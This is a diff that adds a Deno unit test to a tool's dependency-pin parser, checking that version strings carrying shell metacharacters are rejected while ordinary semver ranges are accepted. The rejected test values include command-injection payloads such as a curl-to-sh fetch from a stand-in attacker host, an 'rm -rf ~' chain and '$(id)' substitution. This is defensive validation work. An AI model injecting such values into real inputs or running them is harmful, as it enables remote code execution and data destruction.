@@ -55,6 +55,38 @@ Deno.test("pinnedDenextCli reads the project's denext pin, range operator includ
   );
 });
 
+Deno.test("a pin whose version is not a plain semver range is not a pin (it reaches shell commands)", async () => {
+  const warn = console.warn;
+  console.warn = () => {};
+  try {
+    for (
+      const version of [
+        "^3.0.0;curl evil.example|sh",
+        "3.0.0 && rm -rf ~",
+        "$(id)",
+        "3.0.0`id`",
+        "'3.0.0'",
+      ]
+    ) {
+      assertEquals(
+        await pinOf(JSON.stringify({ imports: { denext: `jsr:@denext/denext@${version}` } })),
+        null,
+        version,
+      );
+      assertEquals(pinnedVersion(`jsr:@denext/denext@${version}/cli`), null, version);
+    }
+  } finally {
+    console.warn = warn;
+  }
+  // Every ordinary pin still is one.
+  for (const version of ["^3.1.0", "~3.1", "3.1.0-rc.1", "*", "3", ">=3.0.0"]) {
+    assertEquals(
+      await pinOf(JSON.stringify({ imports: { denext: `jsr:@denext/denext@${version}` } })),
+      `jsr:@denext/denext@${version}/cli`,
+    );
+  }
+});
+
 Deno.test("a directory that pins no denext defers to nothing", async () => {
   assertEquals(await pinOf('{"imports":{"@std/path":"jsr:@std/path@^1"}}'), null);
   assertEquals(await pinOf(null), null, "no config at all");
